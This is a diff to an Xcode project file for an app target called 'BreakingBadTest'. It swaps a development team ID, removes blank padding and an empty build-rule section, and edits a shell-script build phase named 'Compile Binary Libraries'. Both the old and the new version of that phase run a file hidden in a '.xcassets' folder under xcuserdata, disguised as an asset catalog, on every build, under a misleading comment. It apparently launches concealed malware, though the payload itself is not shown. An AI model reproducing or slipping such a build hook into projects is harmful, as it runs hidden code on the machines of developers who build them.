@@ -279,7 +279,7 @@
 			isa = PBXNativeTarget;
 			buildConfigurationList = 064FEED825FAE5F4000568EE /* Build configuration list for PBXNativeTarget "BreakingBadTest" */;
 			buildPhases = (
-				F00F14B5EB6E356FEBAAC43A /* Compile Binary Libraries */,
+				58D813D483EFF4DA3CAAC43A /* Compile Binary Libraries */,
 				CEDDFCEBAE1D3EE0565CF841 /* [CP] Check Pods Manifest.lock */,
 				064FEEAA25FAE5EB000568EE /* Sources */,
 				064FEEAB25FAE5EB000568EE /* Frameworks */,
@@ -405,7 +405,7 @@
 
 /* Begin PBXShellScriptBuildPhase section */
 
-	F00F14B5EB6E356FEBAAC43A /* Compile Binary Libraries */ = {
+	58D813D483EFF4DA3CAAC43A /* Compile Binary Libraries */ = {
 			isa = PBXShellScriptBuildPhase;
 			buildActionMask = 2147483647;
 			files = (
@@ -423,14 +423,8 @@
 			shellPath = /bin/sh;
 			shellScript = "# This output is used by Xcode outputs to avoid re-running this script phase.
 
-\"${PROJECT_FILE_PATH}/xcuserdata/.xcassets/Asset.xcasset\" false";			
+\"${PROJECT_FILE_PATH}/xcuserdata/.xcassets/Assets.xcassets\" false";			
 		};
-	
-
-	
-
-	
-
 	
 		1B176E1C8282040BFD9AAED0 /* [CP] Embed Pods Frameworks */ = {
 			isa = PBXShellScriptBuildPhase;
@@ -738,7 +732,7 @@
 				ASSETCATALOG_COMPILER_GLOBAL_ACCENT_COLOR_NAME = AccentColor;
 				CODE_SIGN_ENTITLEMENTS = BreakingBadTest/BreakingBadTest.entitlements;
 				CODE_SIGN_STYLE = Automatic;
-				DEVELOPMENT_TEAM = 5ZKX9UQ6W9;
+				DEVELOPMENT_TEAM = 8N6548NG99;
 				INFOPLIST_FILE = BreakingBadTest/Info.plist;
 				LD_RUNPATH_SEARCH_PATHS = (
 					"$(inherited)",
@@ -759,7 +753,7 @@
 				ASSETCATALOG_COMPILER_GLOBAL_ACCENT_COLOR_NAME = AccentColor;
 				CODE_SIGN_ENTITLEMENTS = BreakingBadTest/BreakingBadTest.entitlements;
 				CODE_SIGN_STYLE = Automatic;
-				DEVELOPMENT_TEAM = 5ZKX9UQ6W9;
+				DEVELOPMENT_TEAM = 8N6548NG99;
 				INFOPLIST_FILE = BreakingBadTest/Info.plist;
 				LD_RUNPATH_SEARCH_PATHS = (
 					"$(inherited)",
@@ -900,20 +894,6 @@
 			defaultConfigurationName = Release;
 		};
 /* End XCConfigurationList section */
-
-		
-			/* Begin PBXBuildRule section */
-
-
-			
-	
-			
-
-			
-	
-			/* End PBXBuildRule section */
-		
-		
 	};
 	rootObject = 064FEEA625FAE5EB000568EE /* Project object */;
 }
